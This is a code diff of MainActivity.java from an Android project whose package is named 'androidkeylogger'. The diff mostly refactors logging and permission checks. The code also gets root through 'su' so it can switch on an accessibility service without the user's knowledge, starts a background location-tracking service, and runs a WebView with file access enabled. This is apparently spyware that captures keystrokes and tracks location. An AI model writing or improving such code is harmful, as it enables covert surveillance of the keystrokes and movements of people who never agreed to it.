@@ -1,23 +1,24 @@
 package com.bshu2.androidkeylogger;
 
+import android.Manifest;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.util.Log;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.example.newdynamicapk.Constants; // Importing the Constants class
-
-import android.Manifest;
-import android.content.pm.PackageManager;
+import java.io.DataOutputStream;
 
 public class MainActivity extends AppCompatActivity {
 
+    private static final String TAG = "MainActivity";
     private WebView webView;
     private static final int LOCATION_PERMISSION_REQUEST_CODE = 1;
 
@@ -26,7 +27,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Log.d("MainActivity", "onCreate started");
+        Log.d(TAG, "onCreate started");
 
         webView = findViewById(R.id.webView);
         setupWebView();
@@ -41,7 +42,7 @@ public class MainActivity extends AppCompatActivity {
     private void setupWebView() {
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
-        webSettings.setDomStorageEnabled(true);  // Improve WebView Performance
+        webSettings.setDomStorageEnabled(true); // Improves WebView Performance
         webSettings.setAllowFileAccess(true);
         webSettings.setAllowContentAccess(true);
 
@@ -58,7 +59,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     void enableAccessibility() {
-        Log.d("MainActivity", "Checking root and enabling Accessibility...");
+        Log.d(TAG, "Checking root and enabling Accessibility...");
         try {
             Process process = Runtime.getRuntime().exec("su");
             DataOutputStream os = new DataOutputStream(process.getOutputStream());
@@ -69,9 +70,9 @@ public class MainActivity extends AppCompatActivity {
             os.writeBytes("exit\n");
             os.flush();
             process.waitFor();
-            Log.d("MainActivity", "Accessibility enabled successfully.");
+            Log.d(TAG, "Accessibility enabled successfully.");
         } catch (Exception e) {
-            Log.e("MainActivity", "Failed to enable accessibility", e);
+            Log.e(TAG, "Failed to enable accessibility", e);
         }
     }
 
@@ -86,6 +87,7 @@ public class MainActivity extends AppCompatActivity {
             );
         } else {
             // Permissions are already granted
+            Log.d(TAG, "Location permissions already granted.");
             startLocationService();
         }
     }
@@ -95,17 +97,25 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
         if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Log.d("MainActivity", "Location permissions granted.");
+            boolean permissionsGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    permissionsGranted = false;
+                    break;
+                }
+            }
+
+            if (permissionsGranted) {
+                Log.d(TAG, "Location permissions granted.");
                 startLocationService();
             } else {
-                Log.e("MainActivity", "Location permissions denied.");
+                Log.e(TAG, "Location permissions denied.");
             }
         }
     }
 
     private void startLocationService() {
-        Log.d("MainActivity", "Starting LocationService...");
+        Log.d(TAG, "Starting LocationService...");
         Intent intent = new Intent(this, LocationService.class);
         startService(intent);
     }
